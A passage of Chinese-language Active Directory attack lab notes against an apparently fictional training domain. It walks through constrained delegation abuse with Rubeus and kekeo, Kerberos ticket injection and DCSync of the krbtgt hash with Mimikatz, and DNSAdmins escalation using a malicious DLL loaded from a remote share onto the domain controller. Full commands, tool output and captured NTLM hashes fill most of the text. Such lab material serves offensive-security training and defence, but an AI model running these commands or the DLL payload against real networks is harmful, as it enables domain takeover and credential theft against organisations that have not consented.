d-----        8/21/2020   4:24 AM                Transcripts
d-r---        2/17/2019   5:21 AM                Users
d-----        8/20/2020   4:02 AM                Windows
```

### 方法二：Rubeus.exe

使用rebuse滥用约束委托，可以在一条命令里请求TGT和TGS

```
.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorpmssql.dollarcorp.moneycorp.LOCAL" /ptt
```

查看dcorp-mssql的C盘,证明已经有进入dcorp-mssql的权限
```
PS C:\ad> ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$


    Directory: \\dcorp-mssql.dollarcorp.moneycorp.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/16/2016   6:18 AM                PerfLogs
d-r---        2/17/2019   5:19 AM                Program Files
d-----        2/17/2019   5:17 AM                Program Files (x86)
d-----        8/21/2020   4:24 AM                Transcripts
d-r---        2/17/2019   5:21 AM                Users
d-----        8/20/2020   4:02 AM                Windows
```


## 枚举约束委派的计算机，需要用dev版本Powerview
```
PS C:\ad> Get-DomainComputer –TrustedToAuth


logoncount                    : 157
badpasswordtime               : 2/18/2019 6:39:39 AM
distinguishedname             : CN=DCORP-ADMINSRV,OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 2/10/2022 10:51:48 PM
objectsid                     : S-1-5-21-1874506631-3219952063-538504511-1114
samaccountname                : DCORP-ADMINSRV$
localpolicyflags              : 0
codepage                      : 0
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 2/11/2022 6:51:48 AM
instancetype                  : 4
usncreated                    : 14594
objectguid                    : eda89f4e-dfec-429a-8b78-fe55624b85c9
operatingsystem               : Windows Server 2016 Standard
operatingsystemversion        : 10.0 (14393)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata         : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
serviceprincipalname          : {TERMSRV/DCORP-ADMINSRV, TERMSRV/dcorp-adminsrv.dollarcorp.moneycorp.local, WSMAN/dcorp-adminsrv, WSMAN/dcorp-adminsrv.dollarcorp.moneycorp.local...}
lastlogon                     : 2/15/2022 7:10:20 AM
iscriticalsystemobject        : False
usnchanged                    : 631187
cn                            : DCORP-ADMINSRV
msds-supportedencryptiontypes : 28
whencreated                   : 2/17/2019 1:24:51 PM
primarygroupid                : 515
pwdlastset                    : 4/15/2019 8:55:19 AM
name                          : DCORP-ADMINSRV
dnshostname                   : dcorp-adminsrv.dollarcorp.moneycorp.local


```

只有一台计算机：DCORP-ADMINSRV$

注意```msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}```

由于前面我们已经枚举到DCORP-ADMINSRV$的哈希，这里我们直接使用
```
DCORP-ADMINSRV$：5e77978a734e3a7f3895fb0fdbda3b96
```

### 方法一：kekeo.exe

```
tgt::ask /user:DCORP-ADMINSRV$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96
```

执行
```
PS C:\ad> .\kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Jun 15 2018 01:01:01 - lil!
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       http://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with  9 modules * * */

kekeo # tgt::ask /user:DCORP-ADMINSRV$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96
Realm        : dollarcorp.moneycorp.local (dollarcorp)
User         : DCORP-ADMINSRV$ (DCORP-ADMINSRV$)
CName        : DCORP-ADMINSRV$  [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/dollarcorp.moneycorp.local        [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 5e77978a734e3a7f3895fb0fdbda3b96
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
```

已生成一个TGT，下面命令生成一个TGS
```
tgs::s4u /tgt:TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```
执行
```
kekeo # tgs::s4u /tgt:TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
Ticket  : TGT_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
  [krb-cred]     S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: DCORP-ADMINSRV$ @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] T: [2/15/2022 7:53:59 AM ; 2/15/2022 5:53:59 PM] {R:2/22/2022 7:53:59 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 486676190bd5124fee79374156db13d5410fdc91159519f9537d1448ab1e7d73
  [s4u2self]  Administrator@dollarcorp.moneycorp.local
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_DCORP-ADMINSRV$@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
Service(s):
  [s4u2proxy] TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL
  [s4u2proxy] Alternative ServiceName: ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOC
AL_ALT.kirbi'
```

已生成一个TGS

下面命令利用mimikatz导入到内存中
```
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
执行
```
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp
.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARC
ORP.MONEYCORP.LOCAL_ALT.kirbi

* File: 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirb
i': OK
```
已把TGS导入内存

klist查看
```
PS C:\ad> klist

Current LogonId is 0:0x2a582

Cached Tickets: (3)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 2/15/2022 7:55:59 (local)
        End Time:   2/15/2022 17:53:59 (local)
        Renew Time: 2/22/2022 7:53:59 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
(略)
```


执行dcsync，导出dcorp\krbtgt的NTML哈希
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
执行
```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 2/16/2019 11:01:46 PM
Object Security ID   : S-1-5-21-1874506631-3219952063-538504511-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ff46a9d8bd66c6efd77603da26796f35
    ntlm- 0: ff46a9d8bd66c6efd77603da26796f35
    lm  - 0: b14d886cf45e2efb5170d4d9c4085aa2
```

### 方法二：Rubeus.exe

用Rubeus.exe可以一条命令生成TGT和TGS

```
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt
```

klist查看
```
PS C:\ad> klist

Current LogonId is 0:0x2a582

Cached Tickets: (5)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 2/15/2022 8:06:47 (local)
        End Time:   2/15/2022 18:06:46 (local)
        Renew Time: 2/22/2022 8:06:46 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

使用Mimikatz执行dcsync导出dcorp\krbtgt的哈希
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

# DNSAdmins 提权
原理： DNSAdmins组的成员可以以 dns.exe(系统)的权限加载任意动态链接库（DLL劫持）
前提：需要一个用户是DNSAdmins组成员，并且拥有这个用户的哈希


枚举：
```
PS C:\ad> Get-NetGroupMember -GroupName "DNSAdmins"


GroupDomain  : dollarcorp.moneycorp.local
GroupName    : DnsAdmins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : srvadmin
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1115
IsGroup      : False
MemberDN     : CN=srv admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
```
srvadmin是DnsAdmins组成员
```
srvadmin:a98e18228819e8eec3dfa33cb68b0728
```


下面命令生成一个srvadmin的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
```

模板DLL利用代码：
```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

把system里面的命令换成想要执行的命令即可，例如可以把当前账号添加进管理员用户组：```cmd.exe /k net localgroup administrators user /add```

kali编译成DLL文件：
> x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll

利用DNSAdmins group的组成员权限，使用dnscmd.exe (needs RSAT DNS)配置DNS的动态链接库
```
dnscmd dcorp-dc /config /serverlevelplugindll\\172.16.50.66\dll\mimilib.dll
```
重启DNS服务，使得dll劫持生效（不过这一定会影响公共域环境的DNS服务，不要在公共域环境做这个实验）
```
sc \\dcorp-dc stop dns
sc \\dcorp-dc start dns
```